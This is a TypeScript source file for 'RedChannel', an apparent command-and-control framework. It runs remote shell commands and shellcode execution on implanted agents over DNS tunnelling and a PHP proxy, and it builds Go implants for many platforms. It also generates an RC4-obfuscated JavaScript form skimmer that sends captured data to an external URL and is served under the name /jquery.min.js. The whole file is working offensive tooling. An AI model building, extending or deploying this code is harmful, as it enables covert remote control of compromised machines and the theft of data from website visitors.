import * as fs from "fs";
import * as jsObfuscator from "javascript-obfuscator";
import axios from "axios";
import * as crypto from "crypto";
import * as os from "os";
import * as path from "path";
import { spawn } from "child_process";
import RedChannelUI from "./ui";
import { StringArrayEncoding } from "javascript-obfuscator/typings/src/enums/node-transformers/string-array-transformers/StringArrayEncoding";
import { emsg } from "../utils/utils";
import RedChannelCrypto from "./crypto";
import ECKey from "ec-key";

const RC_VERSION = "0.3.0";

const DATA_PAD_CHAR = "f";
const RECORD_DATA_PREFIX = "2001";
const RECORD_HEADER_PREFIX = "ff00";
const MAX_DATA_BLOCKS_PER_IP = 6;
const MAX_RECORDS_PER_COMMAND = 15; // first record is ip header, rest is data

const VALID_CLASS_ID_REGEX = /^-?[\s_a-zA-Z,]+[\s_a-zA-Z0-9-,]*$/;
const VALID_URL_REGEX = /^http:\/\/\w+(\.\w+)*(:[0-9]+)?\/?(\/[.\w]*)*$/;
const VALID_ROUTE_REGEX = /^\/[a-zA-Z0-9_\-\.]*$/;
const VALID_PROXY_DATA = /^[\:\;a-f0-9\.]+$/;
const VALID_IP_REGEX = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/;
const VALID_HOST_REGEX = /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$/;
const VALID_BUILD_TARGET_OS = /^(windows|linux|darwin|android|netbsd|openbsd|freebsd|dragonfly|solaris)$/i;
const VALID_BUILD_TARGET_ARCH = /^(amd64|arm|arm64|386|ppc64|ppc64le|mipsle|mips|mips64|mips64le)$/i;
const VALID_IMPLANT_RESOLVER =
    /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$/i;

const DEFAULT_CONF_PATH = "conf/redchannel.conf";

export enum AgentCommands {
    AGENT_SYSINFO = 0x01,
    AGENT_CHECKIN = 0x02,
    AGENT_SHELL = 0x03,
    AGENT_MSG = 0x04,
    AGENT_EXEC_SC = 0x05,
    AGENT_SHUTDOWN = 0x06,
    AGENT_KEYX = 0x07,
    AGENT_SET_CONFIG = 0x08,
    AGENT_IGNORE = 0xff,
}

export interface Agent {
    ident: string;
    secret?: Buffer;
    keyx?: ECKey;
    lastseen?: number;
    ip?: string;
    channel?: AgentChannel;
    allow_keyx?: boolean;
    sendq?: any[];
    recvq?: any;
    ignore?: any;
}

export enum AgentChannel {
    DNS = "dns",
    PROXY = "proxy",
}

class RedChannel {
    version = RC_VERSION;

    c2_message_handler: Function;

    agents: { [agentId: string]: Agent };

    /**
     * available commands for 'help' to display
     *
     * agent commands are available while interacting with an agent
     * c2 commands are available in the main menu
     */
    commands: any;

    /**
     * holds the agent object we are currently interacting with
     */
    interact: Agent;

    /**
     * module actions
     *
     * function will be executed when the command is typed
     */
    modules: any;

    master_password: string;

    // name of module currently interacting with
    using_module: string;

    config_file: string;

    config: any;

    // the absolute path to the app directory
    app_root: string = path.resolve("./");

    ui: RedChannelUI | null = null;

    crypto: RedChannelCrypto;

    constructor(c2_message_handler: Function) {
        // c2 message handler is called with mock DNS data when fetching from proxy
        // TODO: this is ugly, change it
        this.c2_message_handler = c2_message_handler;

        this.commands = {
            agent: {
                sysinfo: {
                    params: [],
                    desc: "get system info",
                },
                keyx: {
                    params: [],
                    desc: "start a key exchange with the agent",
                },
                agents: {
                    params: [],
                    desc: "show active agents",
                },
                interact: {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                shell: {
                    params: ["<command>"],
                    desc: "execute a shell command, alias: exec_cmd",
                },
                msg: {
                    params: ["<message>"],
                    desc: "send an encrypted message to the agent, requires keyx",
                },
                shutdown: {
                    params: ["<agent id>"],
                    desc: "shutdown the agent, confirm by entering the id, agent will not reconnect",
                },
                debug: {
                    params: [],
                    desc: "show verbose messages",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
                "set proxy_url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set proxy_enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication",
                },
                "set proxy_key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication",
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to checkin with the c2 (dns or proxy)",
                    validate_regex: /^[0-9]+$/,
                },
                // "set domain": {
                //     params: ["<c2.domain.tld>"],
                //     desc: "set the c2 domain"
                // },
                // "set password": {
                //     params: ["<password>"],
                //     desc: "set the c2 password"
                // },
            },
            c2: {
                keyx: {
                    params: [],
                    desc: "start key exchange with all agents",
                },
                agents: {
                    params: [],
                    desc: "show active agents",
                },
                interact: {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                kill: {
                    params: ["<agent id>"],
                    desc: "deletes the agent from memory, agent may reconnect",
                },
                debug: {
                    params: [],
                    desc: "show verbose messages",
                },
                "use skimmer": {
                    params: [],
                    desc: "use the skimmer module",
                },
                "use proxy": {
                    params: [],
                    desc: "use the proxy module",
                },
                "use static_dns": {
                    params: [],
                    desc: "use the static_dns module to add or remove static dns records",
                },
                "use implant": {
                    params: [],
                    desc: "use the implant module to build agents",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
            },
            module_common: {
                reset: {
                    params: [],
                    desc: "reset config to .conf values",
                },
                config: {
                    params: [],
                    desc: "view config",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
                back: {
                    params: [],
                    desc: "back to main menu",
                },
            },
            skimmer: {
                generate: {
                    params: [],
                    desc: "generate skimmer payload with the specified url and target classes and ids",
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the external skimmer c2 url (http://skimmer.url)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set data_route": {
                    params: ["<route>"],
                    desc: "set the skimmer url data route (/stats)",
                    validate_regex: VALID_ROUTE_REGEX,
                },
                "set target_classes": {
                    params: ["<class 1,class 2,class 3>"],
                    desc: "(optional) target classes with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX,
                },
                "set target_ids": {
                    params: ["<id 1,id 2,id 3>"],
                    desc: "(optional) target ids with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX,
                },
            },
            proxy: {
                fetch: {
                    params: [],
                    desc: "force a fetch from the proxy",
                },
                generate: {
                    params: [],
                    desc: "generate proxy payload with the specified key",
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: VALID_URL_REGEX,
                },
                "set enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication channel",
                },
                "set key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication",
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to fetch data from proxy, in ms",
                },
            },
            static_dns: {
                add: {
                    params: ["<host>", "<ip>"],
                    desc: "add a static DNS A record",
                },
                delete: {
                    params: ["<host>"],
                    desc: "delete static DNS A record",
                },
            },
            implant: {
                build: {
                    params: ["[os]", "[arch]"],
                    desc: "build the agent for the target os and arch",
                },
                generate: {
                    params: ["[os]", "[arch]"],
                    desc: "alias for 'build'",
                },
                log: {
                    params: [],
                    desc: "show the build log",
                },
                "set os": {
                    params: ["<windows|linux|darwin|...>"],
                    desc: "set the target os for the build (GOOS)",
                    validate_regex: VALID_BUILD_TARGET_OS,
                },
                "set arch": {
                    params: ["<amd64|386|arm64|mips|...>"],
                    desc: "set the target arch for the build (GOARCH)",
                    validate_regex: VALID_BUILD_TARGET_ARCH,
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "set implant c2 query interval",
                },
                "set resolver": {
                    params: ["<ip:port>"],
                    desc: "set implant resolver ip:port (8.8.8.8:53)",
                    validate_regex: VALID_IMPLANT_RESOLVER,
                },
                "set debug": {
                    params: ["<1|0>"],
                    desc: "build debug version of the implant",
                },
            },
        };

        this.master_password = "";

        this.modules = {
            proxy: {
                fetch_timer: {}, // stores the loop Timeout ref
                actions: {
                    generate: this.proxy_generate,
                    fetch: this.proxy_fetch,
                    "set enabled": this.proxy_enable,
                },
            },
            skimmer: {
                payload: "", // generated, payload to serve via payload_route,
                actions: {
                    generate: this.skimmer_generate,
                },
            },
            static_dns: {
                actions: {
                    add: this.static_dns_add,
                    delete: this.static_dns_delete,
                },
            },
            implant: {
                actions: {
                    generate: this.implant_build,
                    build: this.implant_build,
                    log: this.implant_log,
                },
            },
        };

        this.using_module = "";

        this.config_file = DEFAULT_CONF_PATH;

        // merged with data from config file
        this.config = {
            c2: {
                domain: "",
                dns_ip: "127.0.0.1",
                dns_port: 53,
                web_ip: "127.0.0.1",
                web_port: 4321,
                agent_interval: 5000,
            },
            skimmer: {
                payload_route: "/jquery.min.js",
                data_route: "/stats",
                url: "",
                target_classes: [],
                target_ids: [],
            },
            proxy: {
                enabled: false,
                url: "",
                key: "",
                interval: 2000,
            },
            implant: {
                os: "windows",
                arch: "amd64",
            },
            static_dns: {},
            debug: false,
        };

        this.app_root = __dirname;

        this.crypto = new RedChannelCrypto();

        this.interact = { ident: "" };
    }

    init_agent(agent_id, channel: AgentChannel) {
        if (typeof this.agents[agent_id] == "undefined") {
            this.agents[agent_id] = {
                ident: agent_id,
                lastseen: 0,
                channel: channel,
                allow_keyx: false,
            };
        }
    }

    kill_agent(agent_id) {
        delete this.agents[agent_id];
    }

    command_keyx(agent_id?: string) {
        if (!this.crypto.privateKey) {
            this.crypto.generate_keys();
        }

        const uncompressedPublicKey = this.crypto.export_pubkey("uncompressed");
        if (!agent_id) {
            // broadcast keyx if no agent is specified
            Object.keys(this.agents).forEach((id) => {
                this.queue_data(id, AgentCommands.AGENT_KEYX, uncompressedPublicKey);
            });
            return;
        }

        if (typeof this.agents[agent_id] != "undefined") {
            this.queue_data(agent_id, AgentCommands.AGENT_KEYX, uncompressedPublicKey);
        }
        return;
    }

    command_shutdown() {
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SHUTDOWN, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
    }

    command_shell(shell_cmd) {
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SHELL, shell_cmd);
    }

    command_exec_sc(shellcode) {
        this.queue_data(this.interact.ident, AgentCommands.AGENT_EXEC_SC, shellcode);
    }

    // agent must be able to decrypt the tag to execute shutdown
    command_sysinfo() {
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SYSINFO, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
    }
    /**
     * config format:
     *
     * agent_interval=5000
     * c2_domain=domain1[,domain2?]
     */
    command_set_config(config: string) {
        this.queue_data(this.interact.ident, AgentCommands.AGENT_SET_CONFIG, config);
    }

    aesEncryptedPayload(data: string): string {
        const buffer = Buffer.from(data);
        const cipher = this.crypto.aes_encrypt(buffer, this.interact.secret);
        const payload = this.make_encrypted_buffer_string(cipher);
        return payload;
    }
    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    queue_data(agentId, command, data) {
        let dataPayload = this.aesEncryptedPayload(data);

        const agent = this.agents[agentId];

        if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");

        let data_blocks = dataPayload.match(/[a-f0-9]{1,4}/g);

        if (!data_blocks) return;

        // prettier-ignore
        var total_records =
            Math.floor(data_blocks.length / MAX_DATA_BLOCKS_PER_IP) +
            (data_blocks.length % MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);

        // prettier-ignore
        var totalCommands =
            Math.floor(total_records / MAX_RECORDS_PER_COMMAND) +
            (total_records % MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);

        const dataId = crypto.randomBytes(2).toString("hex");

        let records: string[] = [];
        // let addedCommands = 1;
        let padded_bytes = 0;
        let record = "";
        for (let record_num = 0; record_num < total_records; record_num++) {
            var blocks = data_blocks.splice(0, MAX_DATA_BLOCKS_PER_IP);

            // pad the last block with trailing Fs
            var last_added_block = blocks.slice(-1)[0];
            padded_bytes = 4 - last_added_block.length;
            blocks[blocks.length - 1] = this.pad_tail(last_added_block, 4);
            if (blocks.length < MAX_DATA_BLOCKS_PER_IP) {
                var blocks_needed = MAX_DATA_BLOCKS_PER_IP - blocks.length;
                for (let j = 0; j < blocks_needed; j++) {
                    blocks.push(DATA_PAD_CHAR.repeat(4));
                    padded_bytes += 4;
                }
            }
            if (padded_bytes > 0) {
                padded_bytes = padded_bytes / 2; // agent assumes bytes not hex strings
            }

            // prettier-ignore
            record =
                RECORD_DATA_PREFIX +
                ":" +
                this.pad_zero(record_num.toString(16), 4) +
                ":" +
                blocks.join(":");
            records.push(record);

            if (totalCommands > 1 && (records.length == MAX_RECORDS_PER_COMMAND - 1 || record_num == total_records - 1)) {
                // prettier-ignore
                record =
                    RECORD_HEADER_PREFIX +
                    ":" +
                    dataId +
                    ":" +
                    this.pad_zero(command.toString(16), 2) +
                    this.pad_zero(padded_bytes.toString(16), 2) +
                    ":" +
                    this.pad_zero(total_records.toString(16), 4) +
                    ":" +
                    "0000:0000:0000:0001";

                records.unshift(record);
                // addedCommands++;

                agent.sendq?.push(records);
                records = [];
            }
        }
        if (totalCommands == 1) {
            // prettier-ignore
            record =
                RECORD_HEADER_PREFIX +
                ":" +
                dataId +
                ":" +
                this.pad_zero(command.toString(16), 2) +
                this.pad_zero(padded_bytes.toString(16), 2) +
                ":" +
                this.pad_zero(total_records.toString(16), 4) +
                ":" +
                "0000:0000:0000:0001";
            records.unshift(record);
        }

        // set to false after keyx is received and there are no more keyx in sendq
        if (command == AgentCommands.AGENT_KEYX) agent.allow_keyx = true;

        if (records.length > 0) {
            agent.sendq?.push(records);
            if (this.config.proxy.enabled && agent.channel == "proxy") {
                this.send_to_proxy(agentId, records);

                // cleanup sendq if proxying to agent
                agent.sendq = [];
            }
        }
        //console.log("* queued up " + total_records + " records in " + total_commands + " command(s) for agent: " + agent_id);
        //console.log("`- records: " + JSON.stringify(records));
    }

    async send_to_proxy(agent_id, records) {
        var str_records = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: str_records,
            k: this.config.proxy.key,
            i: agent_id,
            p: "c",
        };

        return await axios
            .post(this.config.proxy.url, data)
            .then((res) => this.ui.debug(`proxy send response: ${res.data}`))
            .catch((e) => this.ui.error(`failed to send data to proxy: ${e.message}`));
    }
    async get_from_proxy() {
        if (!this.config.proxy.enabled) return;
        if (typeof this.config.proxy.url !== "string" || this.config.proxy.url.length === 0 || typeof this.config.proxy.key !== "string" || this.config.proxy.key.length === 0) return;

        const data = {
            url: this.config.proxy.url,
            method: "POST",
            form: {
                k: this.config.proxy.key,
                f: "a",
            },
        };

        return axios
            .post(this.config.proxy.url, data)
            .then((res) => {
                const body = res.data;
                // we expect the proxy to respond with ERR 1, or similar
                this.ui.debug(`proxy response:\n${body}`);
                if (body.length <= 5) throw new Error(`unexpected response (too small)`);
                if (!VALID_PROXY_DATA.test(body)) throw new Error(`invalid incoming proxy data`);

                // grab proxy response and build mock dns queries
                let data = body.replace(/;$/, "").split(";");
                data.forEach((q) => {
                    let req = {
                        connection: {
                            remoteAddress: this.config.proxy.url,
                            type: "PROXY",
                        },
                    };
                    let res = {
                        question: [
                            {
                                type: "PROXY",
                                name: `${q}.${this.config.c2.domain}`,
                            },
                        ],
                        answer: [],
                        end: () => {},
                    };
                    this.c2_message_handler(req, res);
                });
            })
            .catch((e) => {
                this.ui.error(`proxy fetch failed: ${e.message}`);
            });
    }

    pad_zero(data, max_len) {
        return "0".repeat(max_len - data.length) + data;
    }
    pad_tail(data, max_len) {
        return data + DATA_PAD_CHAR.repeat(max_len - data.length);
    }

    is_command_in_sendq(agent_id, command) {
        var is = false;
        var cmd = this.pad_zero(command.toString(16), 2);

        this.agents[agent_id].sendq?.forEach((q) => {
            if (q[0].substring(0, 4) == RECORD_HEADER_PREFIX) {
                if (q[0].substring(12, 14) == cmd) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    make_ip_string(last_byte) {
        return `${RECORD_HEADER_PREFIX}:0000:${AgentCommands.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
    }

    /**
     * Make a string concatting the cipher data and iv
     * @param {Object} cipher {iv:'', data: ''}
     * @returns a hex string
     */
    make_encrypted_buffer_string(cipher) {
        return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
    }

    count_data_chunks(chunks_array) {
        return chunks_array.filter((a) => a !== undefined).length;
    }

    /**
     * return an array of agent idents with an optional
     * prepended text to each ident
     *
     * used mostly in tab completion
     */
    get_all_agents(prepend = "") {
        const agents: string[] = [];
        Object.keys(this.agents).forEach((a) => {
            agents.push(prepend + this.agents[a].ident);
        });
        return agents;
    }

    get_agent(agent_id): Agent {
        let agent: Agent = { ident: "" };
        Object.keys(this.agents).forEach((a) => {
            if (a == agent_id) {
                agent = this.agents[a];
                return;
            }
        });
        return agent;
    }

    /**
     * skimmer generate action
     */
    skimmer_generate() {
        if (this.config.skimmer.url.length == 0) return { message: "skimmer url is required, see 'help'", error: true };

        let data: Buffer;
        let skimmerJs = "";
        try {
            data = fs.readFileSync("payloads/skimmer.js");
            skimmerJs = data.toString();
        } catch (ex) {
            return { message: `error: failed to generate payload: ${emsg(ex)}`, error: true };
        }

        const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
        const targetIds = "['" + this.config.skimmer.target_ids.join("','") + "']";
        const targetUrl = this.config.skimmer.url;
        const targetDataRoute = this.config.skimmer.data_route;

        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");

        let obfs: jsObfuscator.ObfuscationResult;
        try {
            obfs = jsObfuscator.obfuscate(skimmerJs, {
                compact: true,
                controlFlowFlattening: true,
                transformObjectKeys: true,
                log: false,
                renameGlobals: true,
                stringArray: true,
                stringArrayEncoding: [StringArrayEncoding.Rc4],
                identifierNamesGenerator: "mangled",
            });
            this.modules.skimmer.payload = obfs.getObfuscatedCode();
        } catch (ex) {
            return { message: `error: failed to obfuscate js payload: ${emsg(ex)}`, error: true };
        }

        return {
            message: `skimmer payload set: \n${this.modules.skimmer.payload}`,
            error: false,
        };
    }
    /**
     * proxy generate action
     */
    proxy_generate() {
        if (this.config.proxy.key.length == 0) return { message: "proxy key is required, see 'help'", error: true };

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync("payloads/proxy.php");
            proxyPhp = data.toString();
        } catch (ex) {
            return { message: `error: failed to generate payload: ${emsg(ex)}`, error: true };
        }

        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");
        proxyPhp = proxyPhp.replace(/\n/g, "");
        proxyPhp = proxyPhp.replace(/\s{2,}/g, "");

        this.modules.proxy.payload = `<?php ${proxyPhp} ?>`;
        return {
            message: `proxy payload set: \n${this.modules.proxy.payload}`,
            error: false,
        };
    }
    proxy_fetch() {
        this.get_from_proxy();
        return { message: "fetching data from proxy...", error: false };
    }

    proxy_enable() {
        let message = this.config.proxy.enabled ? `starting proxy checkin at interval: ${this.config.proxy.interval}ms` : `stopping proxy checkin`;

        this.proxy_fetch_loop();
        return { message: message, error: false };
    }

    /**
     * Proxy loop
     */
    proxy_fetch_loop() {
        if (this.modules.proxy.fetch_timer) clearTimeout(this.modules.proxy.fetch_timer);
        if (!this.config.proxy.enabled) return;

        this.get_from_proxy().finally(() => {
            this.modules.proxy.fetch_timer = setTimeout(() => {
                this.proxy_fetch_loop();
            }, this.config.proxy.interval);
        });
    }

    static_dns_add(params) {
        if (params.length < 2) return { message: "please enter a host and ip, see 'help'", error: true };

        let host = params[0];
        let ip = params[1];

        if (!VALID_HOST_REGEX.test(host)) return { message: "invalid host value, see 'help'", error: true };
        if (!VALID_IP_REGEX.test(ip)) return { message: "invalid ip value, see 'help'", error: true };

        this.config.static_dns[host] = ip;
        return { message: "added static dns record", error: false };
    }
    static_dns_delete(params) {
        if (params.length == 0) {
            return {
                message: "please enter a host, see 'help'",
                error: true,
            };
        }

        var host = params[0];
        if (!VALID_HOST_REGEX.test(host)) return { message: "invalid host value, see 'help'", error: true };

        delete this.config.static_dns[host];
        return { message: "deleted static dns record", error: false };
    }

    implant_build_gen_config() {
        let data: Buffer;
        let configData = "";
        let agentConfigPath = `${this.app_root}/agent/config/config.go`;
        try {
            data = fs.readFileSync(`${agentConfigPath}.sample`);
            configData = data.toString();
        } catch (ex) {
            throw new Error(`failed to read agent config file template '${agentConfigPath}.sample': ${emsg(ex)}`);
        }

        configData = configData.replace(/^\s*c\.C2Domain\s*=\s*\".*\".*$/im, `c.C2Domain = "${this.config.c2.domain}"`);
        configData = configData.replace(/^\s*c\.C2Password\s*=\s*\".*\".*$/im, `c.C2Password = "${this.config.c2.plaintext_password}"`);
        configData = configData.replace(/^\s*c\.Resolver\s*=\s*\".*\".*$/im, `c.Resolver = "${this.config.implant.resolver}"`);
        configData = configData.replace(/^\s*c\.C2Interval\s*=.*$/im, `c.C2Interval = ${this.config.implant.interval}`);
        configData = configData.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.config.proxy.enabled}`);
        configData = configData.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.config.proxy.url}"`);
        configData = configData.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.config.proxy.key}"`);

        try {
            fs.writeFileSync(agentConfigPath, configData, { flag: "w" });
        } catch (ex) {
            throw new Error(`failed to write agent config file '${agentConfigPath}': ${emsg(ex)}`);
        }
        return {
            message: `agent config file written to: ${agentConfigPath}`,
            error: false,
        };
    }
    implant_build(params) {
        var implant_os = this.config.implant.os;
        var arch = this.config.implant.arch;
        var debug = this.config.implant.debug;

        if (typeof params[0] !== "undefined") {
            implant_os = params[0];
        }
        if (typeof params[0] !== "undefined") {
            arch = params[1];
        }
        if (!VALID_BUILD_TARGET_OS.test(implant_os)) return { message: "invalid os value, must be supported by Go (GOOS)", error: true };
        if (!VALID_BUILD_TARGET_ARCH.test(arch)) return { message: "invalid arch value, must be supported by Go (GOARCH)", error: true };

        try {
            this.implant_build_gen_config();
        } catch (ex) {
            return { message: emsg(ex), error: true };
        }

        var root_folder = this.app_root;

        var build_path = `${root_folder}/agent`;
        var output_file = `${build_path}/build/agent${implant_os === "windows" ? ".exe" : ""}`;
        var binary = "python";

        // prettier-ignore
        var command_args = [
            `${build_path}/tools/build.py`,
            `${build_path}`,
            `${output_file}`,
            implant_os,
            arch,
            debug && "debug",
        ];
        var env_variables = {
            GOOS: implant_os,
            GOARCH: arch,
            GO111MODULE: "auto",
            GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go cache clean' after build?
            GOPATH: path.join(os.tmpdir(), "rc-build-path"),
            PATH: process.env.PATH,
        };

        try {
            // TODO: do this with docker instead? https://hub.docker.com/_/golang
            var child = spawn(binary, command_args, {
                env: env_variables,
                cwd: build_path /*, windowsVerbatimArguments: true*/,
            });
            child.on("close", (code) => {
                // send this message to the UI somehow
                this.ui.success(`agent build for os: ${implant_os}, arch: ${arch}, debug: ${debug ? "true" : "false"}, return code: ${code}`);
            });
        } catch (ex) {
            return { message: `failed to launch build command: '${emsg(ex)}', build command: '${binary} ${command_args.join(" ")}'`, error: true };
        }

        try {
            var log_stream = fs.createWriteStream(`${root_folder}/agent/build/build.log`, { flags: "w" });
            child.stdout.pipe(log_stream);
            child.stderr.pipe(log_stream);
        } catch (ex) {
            return { message: `failed to write log file: ${emsg(ex)}`, error: true };
        }

        this.config.implant.output_file = output_file;
        var binary_url = this.config.c2.web_url + this.config.c2.binary_route;

        return {
            message: `building ${debug ? "(debug)" : ""} agent for os: ${implant_os}, arch: ${arch}, binary will be available here: ${output_file} and ${binary_url}`,
            error: false,
        };
    }
    implant_log() {
        var log_path = `${this.app_root}/agent/build/build.log`;
        var log_data = "";
        try {
            log_data = fs.readFileSync(log_path).toString();
        } catch (ex) {
            return { message: `error: failed to read build log file: ${emsg(ex)}`, error: true };
        }

        return { message: log_data, error: false };
    }
}

export default RedChannel;
